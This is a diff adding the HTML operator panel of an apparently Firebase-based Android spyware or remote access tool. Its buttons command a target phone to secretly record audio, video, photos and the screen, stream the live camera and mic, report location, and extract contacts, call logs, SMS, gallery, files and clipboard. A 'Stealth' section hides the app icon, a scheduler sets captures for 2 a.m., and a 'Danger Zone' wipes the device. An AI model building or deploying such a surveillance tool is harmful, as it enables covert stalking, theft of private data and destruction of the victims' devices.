@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Guard Panel — Device Detail</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/dashboard.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+</head>
+<body class="dashboard-body">
+
+    <!-- ========== HEADER ========== -->
+    <header class="app-header">
+        <div class="header-left">
+            <button id="backBtn" class="icon-btn" title="Back">←</button>
+            <h1 class="app-name">Device Detail</h1>
+        </div>
+        <div class="header-right">
+            <button id="refreshBtn" class="icon-btn" title="Refresh">🔄</button>
+        </div>
+    </header>
+
+    <!-- ========== MAIN ========== -->
+    <main class="app-main">
+
+        <!-- Device Info -->
+        <section class="section">
+            <div class="device-header-card">
+                <div class="device-header-name" id="deviceName">Loading...</div>
+                <div class="device-header-status" id="deviceStatus">—</div>
+                <div class="device-header-key" id="deviceKey">—</div>
+            </div>
+        </section>
+
+        <!-- Section: Media -->
+        <section class="section">
+            <h2 class="section-title">📸 Media</h2>
+            <div class="cmd-grid">
+                <button class="cmd-btn" data-cmd="SNAP">
+                    <span class="cmd-icon">📸</span>
+                    <span class="cmd-label">Photo</span>
+                </button>
+                <button class="cmd-btn" data-cmd="REC:60">
+                    <span class="cmd-icon">🎤</span>
+                    <span class="cmd-label">Audio 60s</span>
+                </button>
+                <button class="cmd-btn" data-cmd="VIDEO:30">
+                    <span class="cmd-icon">🎥</span>
+                    <span class="cmd-label">Video 30s</span>
+                </button>
+                <button class="cmd-btn" data-cmd="SCREENREC:30">
+                    <span class="cmd-icon">📺</span>
+                    <span class="cmd-label">Screen 30s</span>
+                </button>
+            </div>
+
+            <!-- Custom Duration Row -->
+            <div class="custom-duration-row">
+                <input type="number" id="customDuration" placeholder="Secs" min="5" max="600" value="60">
+                <button class="cmd-btn-sm" data-cmd-template="REC:{n}">🎤 Audio</button>
+                <button class="cmd-btn-sm" data-cmd-template="VIDEO:{n}">🎥 Video</button>
+                <button class="cmd-btn-sm" data-cmd-template="SCREENREC:{n}">📺 Screen</button>
+            </div>
+        </section>
+
+        <!-- Section: Live Stream -->
+        <section class="section">
+            <h2 class="section-title">📡 Live Stream</h2>
+            <div class="cmd-grid">
+                <button class="cmd-btn" data-cmd="CAM_LIVE">
+                    <span class="cmd-icon">🎥</span>
+                    <span class="cmd-label">Live Cam</span>
+                </button>
+                <button class="cmd-btn" data-cmd="MIC_LIVE">
+                    <span class="cmd-icon">🎙️</span>
+                    <span class="cmd-label">Live Mic</span>
+                </button>
+                <button class="cmd-btn danger" data-cmd="LIVE_STOP_ALL">
+                    <span class="cmd-icon">⏹️</span>
+                    <span class="cmd-label">Stop Live</span>
+                </button>
+                <a href="live.html" class="cmd-btn">
+                    <span class="cmd-icon">👁️</span>
+                    <span class="cmd-label">View Live</span>
+                </a>
+            </div>
+        </section>
+
+        <!-- Section: Location -->
+        <section class="section">
+            <h2 class="section-title">📍 Location</h2>
+            <div class="cmd-grid">
+                <button class="cmd-btn" data-cmd="LOCATION">
+                    <span class="cmd-icon">📍</span>
+                    <span class="cmd-label">Get Now</span>
+                </button>
+                <a href="map.html" class="cmd-btn">
+                    <span class="cmd-icon">🗺️</span>
+                    <span class="cmd-label">Open Map</span>
+                </a>
+            </div>
+        </section>
+
+        <!-- Section: Data -->
+        <section class="section">
+            <h2 class="section-title">📊 Data Collection</h2>
+            <div class="cmd-grid">
+                <button class="cmd-btn" data-cmd="BATTERY">
+                    <span class="cmd-icon">🔋</span>
+                    <span class="cmd-label">Battery</span>
+                </button>
+                <button class="cmd-btn" data-cmd="NETWORK">
+                    <span class="cmd-icon">📶</span>
+                    <span class="cmd-label">Network</span>
+                </button>
+                <button class="cmd-btn" data-cmd="CONTACTS">
+                    <span class="cmd-icon">👥</span>
+                    <span class="cmd-label">Contacts</span>
+                </button>
+                <button class="cmd-btn" data-cmd="CALLLOGS">
+                    <span class="cmd-icon">📞</span>
+                    <span class="cmd-label">Call Logs</span>
+                </button>
+                <button class="cmd-btn" data-cmd="SMS">
+                    <span class="cmd-icon">💬</span>
+                    <span class="cmd-label">SMS</span>
+                </button>
+                <button class="cmd-btn" data-cmd="APPS">
+                    <span class="cmd-icon">📱</span>
+                    <span class="cmd-label">Apps</span>
+                </button>
+                <button class="cmd-btn" data-cmd="GALLERY">
+                    <span class="cmd-icon">🖼️</span>
+                    <span class="cmd-label">Gallery</span>
+                </button>
+                <button class="cmd-btn" data-cmd="FILES">
+                    <span class="cmd-icon">📁</span>
+                    <span class="cmd-label">Files</span>
+                </button>
+                <button class="cmd-btn" data-cmd="CLIPBOARD">
+                    <span class="cmd-icon">📋</span>
+                    <span class="cmd-label">Clipboard</span>
+                </button>
+                <button class="cmd-btn" data-cmd="CURRENT_APP">
+                    <span class="cmd-icon">👁️</span>
+                    <span class="cmd-label">Curr App</span>
+                </button>
+            </div>
+        </section>
+
+        <!-- Section: Device Control -->
+        <section class="section">
+            <h2 class="section-title">🔒 Device Control</h2>
+            <div class="cmd-grid">
+                <button class="cmd-btn" data-cmd="LOCK">
+                    <span class="cmd-icon">🔒</span>
+                    <span class="cmd-label">Lock</span>
+                </button>
+                <button class="cmd-btn" data-cmd="ALARM">
+                    <span class="cmd-icon">🔊</span>
+                    <span class="cmd-label">Alarm</span>
+                </button>
+                <button class="cmd-btn" data-cmd="STOP_ALARM">
+                    <span class="cmd-icon">🔇</span>
+                    <span class="cmd-label">Stop Alarm</span>
+                </button>
+                <button class="cmd-btn" data-cmd="PING">
+                    <span class="cmd-icon">🏓</span>
+                    <span class="cmd-label">Ping</span>
+                </button>
+            </div>
+        </section>
+
+        <!-- Section: Stealth -->
+        <section class="section">
+            <h2 class="section-title">🛡️ Stealth</h2>
+            <div class="cmd-grid">
+                <button class="cmd-btn" data-cmd="HIDE">
+                    <span class="cmd-icon">🙈</span>
+                    <span class="cmd-label">Hide Icon</span>
+                </button>
+                <button class="cmd-btn" data-cmd="SHOW">
+                    <span class="cmd-icon">👁️</span>
+                    <span class="cmd-label">Show Icon</span>
+                </button>
+                <button class="cmd-btn" data-cmd="UPDATE">
+                    <span class="cmd-icon">⬆️</span>
+                    <span class="cmd-label">Check Update</span>
+                </button>
+            </div>
+        </section>
+
+        <!-- Section: Schedule -->
+        <section class="section">
+            <h2 class="section-title">⏰ Schedule</h2>
+            <div class="schedule-form">
+                <div class="form-row">
+                    <label>Time</label>
+                    <input type="time" id="schedTime" value="02:00">
+                </div>
+                <div class="form-row">
+                    <label>Type</label>
+                    <select id="schedType">
+                        <option value="audio">🎤 Audio</option>
+                        <option value="video">🎥 Video</option>
+                        <option value="snap">📸 Photo</option>
+                        <option value="location">📍 Location</option>
+                    </select>
+                </div>
+                <div class="form-row">
+                    <label>Duration (sec)</label>
+                    <input type="number" id="schedDuration" value="60" min="5" max="600">
+                </div>
+                <button id="addScheduleBtn" class="btn-primary">Add Schedule</button>
+            </div>
+            <div id="schedulesList" class="schedules-list mt-2"></div>
+        </section>
+
+        <!-- Section: Danger -->
+        <section class="section">
+            <h2 class="section-title" style="color: var(--error);">⚠️ Danger Zone</h2>
+            <div class="cmd-grid">
+                <button class="cmd-btn danger" data-cmd="WIPE" data-confirm="⚠️ WARNING: Ye phone ka SAARA data delete kar dega. Confirm?">
+                    <span class="cmd-icon">🗑️</span>
+                    <span class="cmd-label">Wipe</span>
+                </button>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Toast -->
+    <div id="toast" class="toast hidden"></div>
+
+    <!-- Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+
+    <!-- Scripts -->
+    <script src="js/firebase-config.js"></script>
+    <script src="js/auth.js"></script>
+    <script src="js/commands.js"></script>
+</body>
+</html>
